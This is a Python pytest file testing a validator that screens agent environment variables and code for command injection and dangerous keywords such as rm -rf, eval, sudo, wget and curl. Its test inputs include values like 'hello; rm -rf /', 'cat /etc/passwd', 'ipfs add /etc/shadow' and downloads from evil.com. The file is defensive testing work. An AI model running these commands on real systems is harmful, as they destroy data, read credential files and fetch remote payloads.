import pytest
import os


DANGEROUS_ENV_CHARS = [";", "|", "&", "`", "$", "\n"]
DANGEROUS_INSTRUCTIONS = [
    "rm -rf",
    "os.system",
    "eval(",
    "exec(",
    "chmod",
    "chown",
    "sudo ",
    "PROGENITOR_LIFE_ID",
    "crontab",
    "wget ",
    "curl ",
    "ipfs add",
    "ipfs pin",
]


def crucible_validate_env(value):
    if not value:
        return False, "空值拒止"
    for char in DANGEROUS_ENV_CHARS:
        if char in value:
            return False, f"检测到危险字符: {repr(char)}"
    return True, None


def crucible_validate_agent_name(name):
    if not name:
        return False, "Agent 名称为空"
    for char in DANGEROUS_ENV_CHARS:
        if char in name:
            return False, f"Agent 名称包含危险字符: {repr(char)}"
    return True, None


def crucible_detect_dangerous_instructions(content):
    findings = []
    for line_no, line in enumerate(content.split("\n"), 1):
        for keyword in DANGEROUS_INSTRUCTIONS:
            if keyword in line and not line.strip().startswith("#"):
                findings.append({
                    "line": line_no,
                    "keyword": keyword
                })
    return findings


def crucible_full_audit(env_vars, gene_content):
    results = {
        "passed": True,
        "checks": []
    }

    for var_name, var_value in env_vars.items():
        passed, reason = crucible_validate_env(var_value)
        results["checks"].append({
            "type": "env_var",
            "name": var_name,
            "passed": passed,
            "reason": reason
        })
        if not passed:
            results["passed"] = False

    findings = crucible_detect_dangerous_instructions(gene_content)
    results["checks"].append({
        "type": "dangerous_instructions",
        "passed": len(findings) == 0,
        "findings": findings
    })
    if findings:
        results["passed"] = False

    return results


class TestCrucibleEnvValidation:
    def test_valid_simple_value(self):
        passed, reason = crucible_validate_env("hello")
        assert passed is True
        assert reason is None

    def test_valid_uuid(self):
        passed, reason = crucible_validate_env("PGN@L1-G0-DEVELOPER")
        assert passed is True

    def test_empty_value(self):
        passed, reason = crucible_validate_env("")
        assert passed is False
        assert "空" in reason

    def test_semicolon_injection(self):
        passed, reason = crucible_validate_env("hello; rm -rf /")
        assert passed is False
        assert ";" in reason

    def test_pipe_injection(self):
        passed, reason = crucible_validate_env("hello|cat /etc/passwd")
        assert passed is False

    def test_backtick_injection(self):
        passed, reason = crucible_validate_env("hello`whoami`")
        assert passed is False

    def test_dollar_injection(self):
        passed, reason = crucible_validate_env("$PATH")
        assert passed is False

    def test_newline_injection(self):
        passed, reason = crucible_validate_env("hello\nrm -rf /")
        assert passed is False


class TestCrucibleDangerousInstructions:
    def test_clean_content(self):
        content = "# PGN@L1-G99-TEST\ndef main():\n    return {'status': 'ok'}\n"
        findings = crucible_detect_dangerous_instructions(content)
        assert len(findings) == 0

    def test_detect_rm_rf(self):
        content = "# bad gene\ndef main():\n    rm -rf /tmp/test\n"
        findings = crucible_detect_dangerous_instructions(content)
        assert len(findings) > 0
        assert any("rm -rf" in f["keyword"] for f in findings)

    def test_detect_os_system(self):
        content = "import os\nos.system('ls')\n"
        findings = crucible_detect_dangerous_instructions(content)
        assert len(findings) > 0

    def test_detect_eval(self):
        content = "eval('1+1')\n"
        findings = crucible_detect_dangerous_instructions(content)
        assert len(findings) > 0

    def test_detect_exec(self):
        content = "exec('print(1)')\n"
        findings = crucible_detect_dangerous_instructions(content)
        assert len(findings) > 0

    def test_detect_ipfs_commands(self):
        content = "ipfs add /etc/shadow\n"
        findings = crucible_detect_dangerous_instructions(content)
        assert any("ipfs" in f["keyword"] for f in findings)

    def test_commented_lines_ignored(self):
        content = "# this uses rm -rf\n# and os.system\n\ndef main():\n    return {}\n"
        findings = crucible_detect_dangerous_instructions(content)
        assert len(findings) == 0

    def test_detect_sudo(self):
        content = "sudo rm -rf /\n"
        findings = crucible_detect_dangerous_instructions(content)
        assert any("sudo" in f["keyword"] for f in findings)

    def test_detect_wget_curl(self):
        content = "wget http://evil.com/payload.sh\ncurl http://evil.com/backdoor\n"
        findings = crucible_detect_dangerous_instructions(content)
        assert any("wget" in f["keyword"] for f in findings)
        assert any("curl" in f["keyword"] for f in findings)


class TestCrucibleFullAudit:
    def test_all_clean(self):
        env = {
            "PROGENITOR_LIFE_ID": "PGN@L1-G0-DEV",
            "PROGENITOR_AGENT_NAME": "test-agent"
        }
        content = "# PGN@L1-G99-TEST\ndef main():\n    return {}\n"
        result = crucible_full_audit(env, content)
        assert result["passed"] is True

    def test_env_injection_fails_audit(self):
        env = {
            "PROGENITOR_LIFE_ID": "PGN@L1-G0-DEV; rm -rf /",
            "PROGENITOR_AGENT_NAME": "test-agent"
        }
        content = "def main():\n    return {}\n"
        result = crucible_full_audit(env, content)
        assert result["passed"] is False

    def test_dangerous_code_fails_audit(self):
        env = {
            "PROGENITOR_LIFE_ID": "PGN@L1-G0-DEV",
            "PROGENITOR_AGENT_NAME": "test-agent"
        }
        content = "import os\nos.system('cat /etc/passwd')\n"
        result = crucible_full_audit(env, content)
        assert result["passed"] is False

    def test_multiple_failures(self):
        env = {
            "PROGENITOR_LIFE_ID": "bad;value",
            "PROGENITOR_AGENT_NAME": "bad|name"
        }
        content = "eval('1')\nexec('2')\n"
        result = crucible_full_audit(env, content)
        assert result["passed"] is False
        failed_checks = [c for c in result["checks"] if not c["passed"]]
        assert len(failed_checks) >= 3
